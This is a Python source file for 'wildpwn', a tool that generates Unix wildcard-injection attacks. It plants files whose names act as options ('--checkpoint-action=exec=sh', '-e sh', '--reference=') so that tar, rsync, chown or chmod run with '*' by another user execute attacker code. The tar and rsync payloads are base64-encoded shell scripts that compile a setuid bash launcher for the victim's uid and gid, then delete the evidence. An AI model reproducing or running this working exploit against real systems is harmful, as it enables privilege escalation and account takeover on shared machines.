#!/usr/bin/env python

# wildpwn v0.1.1
# Tool to generate unix wildcard attacks
# Based on this paper: https://www.exploit-db.com/papers/33930/
# Follow (Medium / Twitter): @localh0t

# Import modules
import argparse, base64, os, sys

# define the function blocks
def combinedAttack():
	referenceFile = open(args.folder + ".confrc", 'w')
	referenceFile.close()
	argFile = open(args.folder + "--reference=.confrc", 'w')
	argFile.close()
	os.chmod(args.folder + ".confrc", 0o777)
	if args.file:
		os.symlink(args.file, args.folder + "webrc")
	print "[+] Done! Now wait for something like: chown uid:gid *  (or)  chmod [perms] * on " + args.folder + ". Good luck!"

def tarAttack():
	# feel free to change this
	b64Script = "IyEvYmluL3NoCgojIGdldCBjdXJyZW50IHVzZXIgdWlkIC8gZ2lkCkNVUlJfVUlEPSIkKGlkIC11KSIKQ1VSUl9HSUQ9IiQoaWQgLWcpIgoKIyBzYXZlIGZpbGUKY2F0ID4gLmNhY2hlZmlsZS5jIDw8IEVPRgojaW5jbHVkZSA8c3RkaW8uaD4KaW50IG1haW4oKQp7CnNldHVpZCgkQ1VSUl9VSUQpOwpzZXRnaWQoJENVUlJfR0lEKTsKZXhlY2woIi9iaW4vYmFzaCIsICItYmFzaCIsIE5VTEwpOwpyZXR1cm4gMDsKfQpFT0YKCiMgbWFrZSBmb2xkZXIgd2hlcmUgdGhlIHBheWxvYWQgd2lsbCBiZSBzYXZlZApta2RpciAuY2FjaGUKY2htb2QgNzU1IC5jYWNoZQoKIyBjb21waWxlICYgZ2l2ZSBTVUlECmdjYyAtdyAuY2FjaGVmaWxlLmMgLW8gLmNhY2hlLy5jYWNoZWZpbGUKY2htb2QgNDc1NSAuY2FjaGUvLmNhY2hlZmlsZQoKIyBjbGVhbiB1cApybSAtcmYgLi8nLS1jaGVja3BvaW50PTEnCnJtIC1yZiAuLyctLWNoZWNrcG9pbnQtYWN0aW9uPWV4ZWM9c2ggLndlYnNjcmlwdCcKcm0gLXJmIC53ZWJzY3JpcHQKcm0gLXJmIC5jYWNoZWZpbGUuYw=="
	checkpoint = open(args.folder + "--checkpoint=1", 'w')
	checkpoint.close()
	checkpointAction = open(args.folder + "--checkpoint-action=exec=sh .webscript", 'w')
	checkpointAction.close()
	shellScript = open(args.folder + ".webscript", 'w')
	shellScript.write(base64.b64decode(b64Script))
	shellScript.close()
	print "[+] Done! Now wait for something like: tar cf archive.tar * on " + args.folder + ". Good luck!"

def rsyncAttack():
	# feel free to change this
	b64Script = "IyEvYmluL3NoCgojIGdldCBjdXJyZW50IHVzZXIgdWlkIC8gZ2lkCkNVUlJfVUlEPSIkKGlkIC11KSIKQ1VSUl9HSUQ9IiQoaWQgLWcpIgoKIyBzYXZlIGZpbGUKY2F0ID4gLmNhY2hlZmlsZS5jIDw8IEVPRgojaW5jbHVkZSA8c3RkaW8uaD4KaW50IG1haW4oKQp7CnNldHVpZCgkQ1VSUl9VSUQpOwpzZXRnaWQoJENVUlJfR0lEKTsKZXhlY2woIi9iaW4vYmFzaCIsICItYmFzaCIsIE5VTEwpOwpyZXR1cm4gMDsKfQpFT0YKCiMgbWFrZSBmb2xkZXIgd2hlcmUgdGhlIHBheWxvYWQgd2lsbCBiZSBzYXZlZApta2RpciAuY2FjaGUKY2htb2QgNzU1IC5jYWNoZQoKIyBjb21waWxlICYgZ2l2ZSBTVUlECmdjYyAtdyAuY2FjaGVmaWxlLmMgLW8gLmNhY2hlLy5jYWNoZWZpbGUKY2htb2QgNDc1NSAuY2FjaGUvLmNhY2hlZmlsZQoKIyBjbGVhbiB1cApybSAtcmYgLi8nLWUgc2ggLnN5bmNzY3JpcHQnCnJtIC1yZiAuc3luY3NjcmlwdApybSAtcmYgLmNhY2hlZmlsZS5j"
	checkpoint = open(args.folder + "-e sh .syncscript", 'w')
	checkpoint.close()
	shellScript = open(args.folder + ".syncscript", 'w')
	shellScript.write(base64.b64decode(b64Script))
	shellScript.close()
	print "[+] Done! Now wait for something like: rsync -t * foo:src/ on " + args.folder + ". Good luck!"

# Help & arguments parsing
parser = argparse.ArgumentParser(description="Tool to generate wildcard attacks")
parser.add_argument("payload", type=str, help="Payload to use: (combined | tar | rsync)", metavar="payload", choices=['combined', 'tar', 'rsync'])
parser.add_argument("folder", type=str, help="Where to write the payloads")
parser.add_argument("--file", type=str, help="Path to file for taking ownership / change permissions. Use it with combined attack only.")
args = parser.parse_args()

# Add ending slash
if not args.folder.endswith('/'):
	args.folder = args.folder + "/"

# Map the inputs to the function blocks
runPayload = {"combined" : combinedAttack,
           "tar" : tarAttack,
           "rsync" : rsyncAttack,
}

# Run payload
print "[!] Selected payload: " + args.payload
runPayload[args.payload]()
